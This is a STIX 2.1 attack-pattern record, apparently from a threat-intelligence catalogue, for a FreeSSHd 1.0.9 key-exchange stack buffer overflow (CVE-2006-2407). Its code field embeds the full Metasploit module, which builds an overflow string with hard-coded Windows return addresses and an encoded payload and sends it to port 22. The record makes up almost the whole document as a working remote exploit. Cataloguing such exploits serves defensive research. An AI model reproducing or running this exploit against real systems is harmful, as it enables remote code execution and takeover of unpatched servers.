{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a692397-32cd-464f-bbc5-e4a6ed4e4862",
    "created": "2024-08-14T16:48:01.332338Z",
    "modified": "2024-08-14T16:48:01.332342Z",
    "name": "FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow",
    "description": " This module exploits a simple stack buffer overflow in FreeSSHd 1.0.9. This flaw is due to a buffer overflow error when handling a specially crafted key exchange algorithm string received from an SSH client. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ssh/freesshd_key_exchange.rb",
            "external_id": "freesshd_key_exchange.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2407"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a simple stack buffer overflow in FreeSSHd 1.0.9.\n        This flaw is due to a buffer overflow error when handling a specially\n        crafted key exchange algorithm string received from an SSH client.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2006-2407'],\n          ['OSVDB', '25463'],\n          ['BID', '17958'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x77e56f43 } ],\n          [ 'Windows XP Pro SP0 English',   { 'Ret' => 0x77e51877 } ],\n          [ 'Windows XP Pro SP1 English',   { 'Ret' => 0x77e53877 } ],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2006-05-12',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(22)\n      ])\n  end\n\n  def exploit\n    connect\n\n    sploit =  \"SSH-2.0-OpenSSH_3.9p1\"\n    sploit << \"\\x0a\\x00\\x00\\x4f\\x04\\x05\\x14\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    sploit << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\xde\"\n    sploit << rand_text_alphanumeric(1055) + [target.ret].pack('V')\n    sploit << payload.encoded + rand_text_alphanumeric(19000) + \"\\r\\n\"\n\n    res = sock.recv(22)\n    if ( res =~ /SSH-2.0-WeOnlyDo 1.2.7/)\n      print_status(\"Trying target #{target.name}...\")\n      sock.put(sploit)\n    else\n      print_status(\"Not running a vulnerable version...\")\n    end\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-05-12",
    "x_mitre_platforms": [
        "win'"
    ]
}